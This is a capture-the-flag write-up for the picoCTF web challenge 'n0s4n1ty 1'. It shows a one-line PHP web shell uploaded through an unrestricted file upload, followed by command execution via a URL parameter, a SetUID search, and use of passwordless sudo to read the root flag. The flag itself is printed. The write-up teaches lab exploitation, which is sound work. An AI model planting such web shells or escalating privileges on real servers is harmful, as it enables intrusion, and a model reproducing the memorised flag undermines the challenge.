This is a CTF write up for the PICO CTF web exploit challenge "n0s4n1ty 1".

-- SETUP --
In the challenge description they first start out by telling you that there was a problem in the file upload implementation on their website. 
Besides that, the biggest hint they gave was that the file was in the /root directory.

-- ACTION --
Once on the website you are greeted with a simple interface of a profile picture preview, an upload file button, and another to initiate the action of uploading the file.
If you open the devtools you can see they purposefully made the upload able to take any type of file... so my first thought is a PHP script to allow command line
in the URL bar. 

So I made a simple file that included

      <?php system($_GET['cmd']); ?>

and uploaded the file to the website. The website then redirects you to the directory that contains your file, which you can go to using /uploads/file.php.

Since I have <?php system($_GET['cmd']); ?> in the file I tried running it using 'id' first. /uploads/file.php?cmd=id displayed the ID of the website so I knew it had worked.
Now, I then started tinkering throught the directories by using 'ls' and going up in directories ../../../../ and found the root directory.

Once trying to enter, there was nothing. To check what privileges root has ls -ld /root was runn and I saw that I have no read privileges.

Putting together a command: find / -perm -4000 -type f 2>/dev/null (find, from the root directory, files with the SetUID bit, only show files and don't display error messages.) I was given a list of
files that have the setuid. 

/usr/bin/sudo was one of the files so that was where my attack went to. If I can have access to sudo then I can run any command as the root. I used sudo -l just to double check what privileges I
will have available and just as suspected, (ALL) NOPASSWD: ALL. 

Perfect!! Now all I have to do is run sudo (insert any command). cmd=sudo cat ../../../../root/flag.txt gives me the flag.

picoCTF{wh47_c4n_u_d0_wPHP_f7424fc7}
